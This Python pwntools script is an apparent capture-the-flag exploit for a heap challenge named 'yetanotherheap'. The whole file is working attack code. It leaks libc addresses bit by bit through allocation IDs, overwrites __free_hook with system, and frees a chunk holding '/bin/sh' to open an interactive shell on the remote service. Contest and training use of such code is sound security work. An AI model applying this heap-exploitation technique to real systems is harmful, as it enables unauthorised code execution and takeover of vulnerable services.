from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "yetanotherheap.hackable.software"
    port = 1337
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil('>')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)


def allocate(size, data, shutdown=False):
    menu(1)
    rs(str(size))
    recvuntil(': ')
    try:
        id = int(recvline())
    except:
        id = 0
    if shutdown:
        rs(data, new_line=False)
        r.shutdown('write')
    else:
        rs(data.ljust(size, '\x00'), new_line=False)
    return id


def free(id):
    menu(2)
    rs(str(id))


size = 10

obj = allocate(0x100, "hoge")
dummy = allocate(0x30, "/bin/sh")
print('dummy:', dummy)
free(dummy - 1)
allocate(0x30, 'sh\x00\x00' + p32(1) + p32(0) + p32(0))

free(obj)

while True:
    x = allocate(size, "gue")
    print(x)
    if x >= 31:
        break

print('uo')
l = [1 for i in range(48)]
while True:
    x = allocate(size, "gue")
    bit = x - 32
    if x >= (48 + 32):
        break
    l[bit] = 0

libc_base = 0
for i, x in enumerate(l):
    libc_base += x << i

libc_base -= 0x1ec310
print(hex(libc_base))

buf = libc_base + 0x1eb710
free_hook = libc_base + 0x1eeb28
master_canary = free_hook + 0x4a40
system = libc_base + 0x55410

print(hex(master_canary - free_hook))

obj = allocate(0x600, "hoge")
free(obj - 1)

obj = allocate(0x600, p32(0x5900) +
        p32(0xffffffff) +p32(0xffffffff) + p32(0xffffffff ^ (1 << 31)))

wait_for_attach()
print(obj)
payload = ''
payload += 'A' * (free_hook - buf)
payload += p64(system)
#payload += 'A' * (master_canary - free_hook)

obj = allocate(0x5900 - 15, payload)
print(obj)

free(dummy)

interactive()
